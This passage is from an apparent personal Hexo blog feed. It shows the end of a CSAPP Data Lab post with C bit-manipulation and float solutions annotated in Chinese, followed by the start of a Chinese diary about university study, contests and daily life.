operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// res为1则x-y小于0</span>  <span class="token keyword">return</span> cond1 <span class="token operator">|</span> <span class="token punctuation">(</span>cond2 <span class="token operator">&amp;</span> <span class="token punctuation">(</span>cond3 <span class="token operator">|</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// cond2为1还要进行cond3或res的验证故用&amp;</span><span class="token punctuation">&#125;</span><span class="token comment">// 4</span><span class="token comment">/* * logicalNeg - implement the ! operator, using all of *              the legal operators except ! *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 *   Legal ops: ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 12 *   Rating: 4 */</span><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> negx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">|</span> negx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">/*   int a=~x+1;   int b=(x^a)>>31;//这种不行是没考虑到溢出的情况.比如四位的数1000,他的取反加一还是1000   return a+1;   */</span><span class="token punctuation">&#125;</span><span class="token comment">/* howManyBits - return the minimum number of bits required to represent x in *             two's complement *  Examples: howManyBits(12) = 5 *            howManyBits(298) = 10 *            howManyBits(-5) = 4 *            howManyBits(0)  = 1 *            howManyBits(-1) = 1 *            howManyBits(0x80000000) = 32 *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *  Max ops: 90 *  Rating: 4 */</span><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 思路高位有值的话就不能去掉,要找到最高位</span>  <span class="token keyword">int</span> iszero <span class="token operator">=</span> <span class="token operator">!</span>x<span class="token punctuation">;</span>    <span class="token comment">// 判断是否为0,其实不用判断照样可以,因为按照后面的分法,如果是0则所有的bit都是0</span>  <span class="token keyword">int</span> flag <span class="token operator">=</span> x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token comment">// 取出符号位</span>  <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>  x <span class="token operator">=</span> <span class="token punctuation">(</span>flag <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>flag<span class="token punctuation">)</span> <span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x>0时不变,x&lt;0时把0都变成1</span>  <span class="token keyword">int</span> bit_16<span class="token punctuation">,</span> bit_8<span class="token punctuation">,</span> bit_4<span class="token punctuation">,</span> bit_2<span class="token punctuation">,</span> bit_1<span class="token punctuation">,</span> bit_0<span class="token punctuation">;</span>  bit_16 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// 先把x规格化,判断每一个部分有没有值</span>  x <span class="token operator">>>=</span> bit_16<span class="token punctuation">;</span>  bit_8 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// 先把x规格化,判断每一个部分有没有值</span>  x <span class="token operator">>>=</span> bit_8<span class="token punctuation">;</span>  bit_4 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 先把x规格化,判断每一个部分有没有值</span>  x <span class="token operator">>>=</span> bit_4<span class="token punctuation">;</span>  bit_2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 先把x规格化,判断每一个部分有没有值</span>  x <span class="token operator">>>=</span> bit_2<span class="token punctuation">;</span>  bit_1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先把x规格化,判断每一个部分有没有值</span>  x <span class="token operator">>>=</span> bit_1<span class="token punctuation">;</span>  bit_0 <span class="token operator">=</span> x<span class="token punctuation">;</span> <span class="token comment">// 最后的x只能是1或者0</span>  <span class="token keyword">int</span> res <span class="token operator">=</span> bit_16 <span class="token operator">+</span> bit_8 <span class="token operator">+</span> bit_4 <span class="token operator">+</span> bit_2 <span class="token operator">+</span> bit_1 <span class="token operator">+</span> bit_0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// return iszero|(mask&amp;res);</span>  <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// float</span><span class="token comment">/* * floatScale2 - Return bit-level equivalent of expression 2*f for *   floating point argument f. *   Both the argument and result are passed as unsigned int's, but *   they are to be interpreted as the bit-level representation of *   single-precision floating point values. *   When argument is NaN, return argument *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 做到这道题,你就要去看看规格化和非规格化了,在我的笔记里面有</span>  <span class="token comment">// expr,s,frac</span>  <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 把s,expr,frac全部取出来</span>  <span class="token keyword">unsigned</span> expr <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 把s,expr,frac全部取出来</span>  <span class="token keyword">unsigned</span> frac <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">&amp;</span> <span class="token number">0x7FFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 把s,expr,frac全部取出来</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> frac <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span> <span class="token comment">// 就是0,直接返回uf</span>  <span class="token comment">// 无穷大</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span>  <span class="token comment">// 非规格化</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    frac <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//*2</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">|</span> frac<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 规格化</span>  expr<span class="token operator">++</span><span class="token punctuation">;</span>                                 <span class="token comment">// 规格化了,乘以2,毕竟隐藏的尾数是1</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>expr <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">|</span> frac<span class="token punctuation">;</span> <span class="token comment">// 拼凑出厂</span><span class="token punctuation">&#125;</span><span class="token comment">/* * floatFloat2Int - Return bit-level equivalent of expression (int) f *   for floating point argument f. *   Argument is passed as unsigned int, but *   it is to be interpreted as the bit-level representation of a *   single-precision floating point value. *   Anything out of range (including NaN and infinity) should return *   0x80000000u. *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//因为是将其转化为int型的整数,所以可以舍弃掉一些</span>  <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> expr <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> frac <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">&amp;</span> <span class="token number">0x7FFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取到每个位</span>  <span class="token comment">// 讨论无穷大</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 当expr=0的时候,隐式位置位0,量级太小了,乘以2的-127次方更小</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token comment">// 无穷大,按照题目要求输出0x80000000u.</span>  <span class="token comment">// 考虑规格化的情况</span>  <span class="token keyword">int</span> E <span class="token operator">=</span> expr <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">;</span>      <span class="token comment">// E是阶码</span>  frac <span class="token operator">=</span> frac <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 有一个隐式的一,要给他加上</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>E <span class="token operator">></span> <span class="token number">31</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token comment">// 太大了,转成int就爆了</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>E <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 太小了,frac移动完后转成int直接被舍掉了</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>E <span class="token operator">>=</span> <span class="token number">23</span><span class="token punctuation">)</span>    frac <span class="token operator">&lt;&lt;=</span> <span class="token punctuation">(</span>E <span class="token operator">-</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 移位,因为M就是二进制的表示方式,所以直接移动小数点</span>  <span class="token keyword">else</span>    frac <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> E<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> frac<span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token operator">~</span>frac <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 其中已经把E乘进去了</span><span class="token punctuation">&#125;</span><span class="token comment">/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x *   (2.0 raised to the power x) for any 32-bit integer x. * *   The unsigned value that is returned should have the identical bit *   representation as the single-precision floating-point number 2.0^x. *   If the result is too small to be represented as a denorm, return *   0. If too large, return +INF. * *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 分析规格化和非规格化</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">149</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// expr最小也要是1,故得到的E最小为-126</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span> <span class="token comment">// 多余的尾数,E只能提供2^(-126),剩下的靠尾数,尾数还能提供23位</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">126</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">23</span> <span class="token operator">+</span> a<span class="token punctuation">;</span>    <span class="token comment">// 计算出偏移的位数</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">;</span> <span class="token comment">// 以上两种情况是非规格化的情况,能表示的数字更小</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span> <span class="token comment">// E的最大值是127,不能全为1</span>    <span class="token comment">// x=expr-bias;,一般bias是127</span>    <span class="token keyword">int</span> expr <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> expr <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">;</span><span class="token comment">//即为+INF</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024杂记</title>
      <link href="/2023/12/09/daily_write_2024/"/>
      <url>/2023/12/09/daily_write_2024/</url>
      
        <content type="html"><![CDATA[<h2 id="2023-10-13-09-24-06"><a href="#2023-10-13-09-24-06" class="headerlink" title="2023-10-13 09:24:06"></a>2023-10-13 09:24:06</h2><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p><del>眨眼间,曾今期盼的大学生活已经过去了约莫43天,时间过得是真的快</del><br>在这几日的学习中,发现自己对c++的能力真的是一眼难尽,难一点的题目都做不出来,一道题要磕半天,还老忘.<br>但学习学习这,发现自己也是有所进步的,能多多翻阅blog,但会走马观花,一扫略之,致使在应用或者是回忆之时毫无头绪,故得出c++的学习方法一:<br><strong>研究每一行每一句并且分析每一句的思路</strong></p><p>很多时候,发现自己的代码写的太丑陋,或者说太繁杂,原因之一是自己不列草稿,在一开始就没又理清思路,c++是一种模块式的语言,你要把一个抽象的现实的问题转化为数学,转化为机械的思维<br>分清楚每一步要干什么,考虑类似于边界情况等特殊情况<br><strong>理清问题,转化语言,确定思路</strong></p><p>自己的代码肯定是不如大佬的代码好看简介,优美,吾等在初学阶段要做的就是不断学习别人的代码,别人的思路,别人的切入方式.<br><strong>学习别人的考虑问题方式,切入方式</strong></p><p>对于算法的学习不能在听了一点课后就收手,要做题,独立思考,复现算法.<br><strong>记忆,彻底理解算法(可以手动画图)</strong></p><h3 id="多多做题"><a href="#多多做题" class="headerlink" title="多多做题"></a>多多做题</h3><p>接下来是发疯时间:<br>最近的scut每日一练真的给我练崩了,好多好多题不会,但zfw能迅速通关,是不是自己敲代码是太不沉浸,太繁琐,思路过于繁杂,不然怎会如此低效,挺害怕28号的比赛能力还不足以进队,那这几十天的学习就有点浪费了,达不成目标真的很失落,所以现在要加倍努力!!!!</p><p>每天都有雯雯给我占座,真的好好好高兴,有一个和我一样一点不会的人在我旁边上课真的感觉贼拉舒适,有熟悉的人在旁边还是好的,做啥事不会放不开手脚,聊天都舒服.<br>最近在数分,线代,工图上全是挫折,天天跌倒,主要就是个大无语状态,这些学科是难的,上课还是要好好听课,下课了空点时间出来复习,但我觉得现在还是要将很多时间教给c++</p><p>感觉大学生活真的很丰富,每个人都有可以选择的生活,但我好像是每天窝在宿舍一尺三分地,学习c++<del>虽然好像没学多少</del>.是不是自己的领悟能力低于他人呜呜.</p><p>对所有的所有要有清晰的规划,在干任何事前理清思路,理清思路,理清思路!!!!</p><h2 id="2023-10-14-11-00-19"><a href="#2023-10-14-11-00-19" class="headerlink" title="2023-10-14 11:00:19"></a>2023-10-14 11:00:19</h2><p>昨天下午下了课突然来了兴致,去和几个同学去看卓越班打二班,看着从十几分的分差打到等分,最后靠罚篮打进加时赛,虽然最后二班加时赛输了但我觉得他们至少有了能赢的机会<br><del>虽然我觉得两边打的都很烂,但加时赛还是很有冲击力的</del><strong>希望我们今天下午的比赛也能打个酣畅淋漓,不后悔,大家都能打出满意的水平</strong></p><p>打完球,叫了榜一起拉单杠,然后去西亚二楼吃杀猪粉(是真的好吃量大<del>虽然贵了点,但挺值得</del>)</p><p>本想回宿舍把没敲的代码补回来,问了下雯雯,一人拎了一瓶酒绕着校园散步扯蛋<br>一不小心嘴瓢了,把自己的所有破事全讲了,或者说自己的进化史hh,很多时候,很喜欢这种散步闲逛的感觉,没有目的,没有方向,有人伴着,不知觉间走到12点看着她刷卡进宿舍,一天的生活好似啥也没干,但舒坦了</p><p><strong>有些时候,生活不能像一根弦,天天紧绷着,时不时放松下散步便是最好的方式</strong></p><p>但今天真的要多学学代码,<strong>打题,打题,打题</strong>,一天不做题,一天比一天菜,菜逼!!!再不做题,就进不了队了!!!</p><p>希望今天能吃到好吃的,做出题目来,学习不分散注意力<del>虽然这些是在通选课上敲得</del></p><h2 id="2023-10-15-19-43-37"><a href="#2023-10-15-19-43-37" class="headerlink" title="2023-10-15 19:43:37"></a>2023-10-15 19:43:37</h2><p>今天一大早爬起来,就想尝试一把绿题,毕竟还没有认认真真的打过,挑了到题单上的深搜,题号是<strong>P3956 [NOIP2017 普及组] 棋盘</strong>,怕自己做太久,特地打上时间戳,谁知一低头一抬头,一个多小时过去,发现自己还是没有处理好<del>或者说没想好怎么处理魔法</del>,当我脑袋一懵逼,就开始看题解,简简单单扫过去,挑了个看得懂的,抄呀抄,发现visualstudio不知持这种语法,顿时蚌埠住了,抄完后想着我运行不了,调试不了也交了,直接WA了一大片,之后采取老本行,逐行对视,没查出来,像昨天一样死在局部变量上.</p><p><strong>我直接反手一个大反思</strong>是什么在这两天耗费了我六个小时,是题目吗,不不不,脑瘫不能怪题目,怪自己,这就叫啥好高骛远,得意忘形,就是一壶子不满半壶子晃,就像前两天特地去学的diljkstra算法和floyd算法,发现就在y总的搜索与图论里面讲了,但我却费多了这么多时间,却没有什么收获,这只能说是政策的失败,策略的失误,还有自己太菜了.<del>菜就多练,但要正确的练</del></p><p><strong>我直接一个恐慌</strong>还有13天就要开始新生赛了,多思考,多练,先将题目语言努力转化为数学语言在码出来,没思考完,别动🖊笔</p><h2 id="2023-10-17-23-57-30"><a href="#2023-10-17-23-57-30" class="headerlink" title="2023-10-17 23:57:30"></a>2023-10-17 23:57:30</h2><p><strong>只能说今天很开心</strong><br>今天去和雯雯出门吃了海底捞<del>虽然挺贵的,我们都没有6.9折,只能原价买</del>,但有一说一,海底捞的体验是真的好,像把顾客当婴儿一样照顾,啥倒水呀,带路呀,小举动见证企业文化.只能说吃的特别的满意,而且今天算是工作日,人也偏少,不用排队,不用等待,上菜超级快,所以说,不亏.  </p><p><strong>题还是要多打</strong>今天主要是看了y总的课,又花了点时间把算法又背了背,发现自己的板子还是很不熟练,但要学的东西又有好多,总有种学了这个不会那个的感觉,好好学又不够时间的感觉,果然时间都是挤出来的,现在越发怀疑自己新生赛到底能不能进队一起训练,毕竟压力太大,自己又太菜了,还是要多学,多练,挤出更多的时间来学习,来做题,扩展思维</p><h2 id="2023-10-20-16-08-27"><a href="#2023-10-20-16-08-27" class="headerlink" title="2023-10-20 16:08:27"></a>2023-10-20 16:08:27</h2><p><strong>浅浅记录一下</strong><br>昨天,蚊蚊的瓜田爆了,本来在前天晚上,蚊蚊还立下flag说是要在毕业后把b的所有小瓜全部告诉我,让我对b有一个全面清晰的认识与了解,刷新一波映像,怎知天有不测风云.<br>昨晚刚和丽云和蚊蚊吃完饭回来,b变找到丽云,进行了对蚊蚊骂他的朋友圈的一个询问,然后自动爆出了所有,蚊蚊反手就是一个反向自爆,使得卑微的丽云在一个半小时内吃到了一整个瓜田,来了个强制刷新,只能对王尸傅感到遗憾,错失了这么一个惊世超级无敌大瓜,这两日我们进行了多次会晤,打破信息差,了解这件事情的全貌.哈哈哈哈哈哈哈哈哈只能说笑死我了.  </p><p>这两天不知道为什么眼睛贼酸,天天想睡觉,兴许是高中生附体了,但自己又很亢奋,有时又好累,一点点疲倦.所以说中午要睡一小会,晚上11点到12点就要滚上床.</p><p><strong>冲动消费</strong><br>#昨天花了2350买了台佳能200D一代加上一个小痰盂三代和一个佳能17-85变焦,冲动了,直接全款拿下.总觉得有种错觉,就是买了就学会了,买了后就懒得研究了哈哈哈.多拿相机多拍拍,多摸索,多学习.看看能不能晚点落灰,2350满足了小时候的愿望,只是这个月要吃泡面了,生活费花完了呜.<br>但有一说一钱不就是拿来花的吗,天天把钱放在零钱通里面,三天攒一瓶可乐,这刺激根本比不上花个一两千来一波冲动消费,所以说花钱就是爽,<del>但花完了就不是很爽</del></p><p><strong>热身赛&amp;&amp;新生赛</strong><br>22号打热身赛,28号打新生赛,这两天又没怎么做题,突然间发现原来豌豆射手也是队爷,原来大家以前都拿过奖,寄,大寄特寄</p><p><strong>蚊蚊专场</strong><br>骂人骂的很爽.骂人的意义在于让对方知道自己在骂他.而否认的意义在于保留一点正常社交的体面.如果已经心知肚明还要咄咄逼人,可能是在寻求否认后得到的心理安慰,证明自己的清洁清白一尘不染一事无错,或者说他只是单纯是一个狡诈的m.当然,否认的意义也在于双方都知道对面在放屁的情况下膈应一手,阿门,希望不要再碰到傻逼了.</p><h2 id="2023-10-29-17-34-48"><a href="#2023-10-29-17-34-48" class="headerlink" title="2023-10-29 17:34:48"></a>2023-10-29 17:34:48</h2><h3 id="10-26"><a href="#10-26" class="headerlink" title="10-26:"></a>10-26:</h3><p>今天写这玩意的原因是笔记本的网卡好像这两天抽风了,加载个洛谷都要好几分钟,受不了了</p><h3 id="今日再记"><a href="#今日再记" class="headerlink" 